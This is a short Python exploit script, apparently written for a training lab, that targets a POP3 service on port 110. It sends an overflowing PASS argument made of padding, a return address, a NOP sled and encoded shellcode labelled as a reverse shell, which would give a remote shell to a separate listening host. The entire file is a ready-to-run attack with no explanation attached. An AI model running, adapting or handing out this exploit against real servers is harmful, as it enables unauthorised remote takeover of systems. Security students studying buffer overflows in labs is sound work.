#!/usr/bin/python3
# coding: utf-8

import sys, socket


if len(sys.argv) != 2:
  print("\nUsage: python {} <host-ip>\n".format(sys.argv[0]))
  sys.exit(1)

reverse_shell = ("\xb8\x41\x9b\x43\x01\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x0e\x03\x06\x95\xa1\xf4\x74\x41\xa7"
"\xf7\x84\x92\xc8\x7e\x61\xa3\xc8\xe5\xe2\x94\xf8\x6e\xa6\x18"
"\x72\x22\x52\xaa\xf6\xeb\x55\x1b\xbc\xcd\x58\x9c\xed\x2e\xfb"
"\x1e\xec\x62\xdb\x1f\x3f\x77\x1a\x67\x22\x7a\x4e\x30\x28\x29"
"\x7e\x35\x64\xf2\xf5\x05\x68\x72\xea\xde\x8b\x53\xbd\x55\xd2"
"\x73\x3c\xb9\x6e\x3a\x26\xde\x4b\xf4\xdd\x14\x27\x07\x37\x65"
"\xc8\xa4\x76\x49\x3b\xb4\xbf\x6e\xa4\xc3\xc9\x8c\x59\xd4\x0e"
"\xee\x85\x51\x94\x48\x4d\xc1\x70\x68\x82\x94\xf3\x66\x6f\xd2"
"\x5b\x6b\x6e\x37\xd0\x97\xfb\xb6\x36\x1e\xbf\x9c\x92\x7a\x1b"
"\xbc\x83\x26\xca\xc1\xd3\x88\xb3\x67\x98\x25\xa7\x15\xc3\x21"
"\x04\x14\xfb\xb1\x02\x2f\x88\x83\x8d\x9b\x06\xa8\x46\x02\xd1"
"\xcf\x7c\xf2\x4d\x2e\x7f\x03\x44\xf5\x2b\x53\xfe\xdc\x53\x38"
"\xfe\xe1\x81\xef\xae\x4d\x7a\x50\x1e\x2e\x2a\x38\x74\xa1\x15"
"\x58\x77\x6b\x3e\xf3\x82\xfc\x81\xac\x8d\xc5\x69\xaf\x8d\x34"
"\xd1\x26\x6b\x5c\x35\x6f\x24\xc9\xac\x2a\xbe\x68\x30\xe1\xbb"
"\xab\xba\x06\x3c\x65\x4b\x62\x2e\x12\xbb\x39\x0c\xb5\xc4\x97"
"\x38\x59\x56\x7c\xb8\x14\x4b\x2b\xef\x71\xbd\x22\x65\x6c\xe4"
"\x9c\x9b\x6d\x70\xe6\x1f\xaa\x41\xe9\x9e\x3f\xfd\xcd\xb0\xf9"
"\xfe\x49\xe4\x55\xa9\x07\x52\x10\x03\xe6\x0c\xca\xf8\xa0\xd8"
"\x8b\x32\x73\x9e\x93\x1e\x05\x7e\x25\xf7\x50\x81\x8a\x9f\x54"
"\xfa\xf6\x3f\x9a\xd1\xb2\x20\x79\xf3\xce\xc8\x24\x96\x72\x95"
"\xd6\x4d\xb0\xa0\x54\x67\x49\x57\x44\x02\x4c\x13\xc2\xff\x3c"
"\x0c\xa7\xff\x93\x2d\xe2")

payload = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + reverse_shell + "B"*100
ipAddress = sys.argv[1]

port = 110

try:
  print("Sending 2700 bytes...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER test\r\n")
  s.recv(1024)
  s.send("PASS {}\r\n".format(payload))
  s.recv(1024)
  s.close()
except:
  print("\nConnection error...\n")
  sys.exit(0)
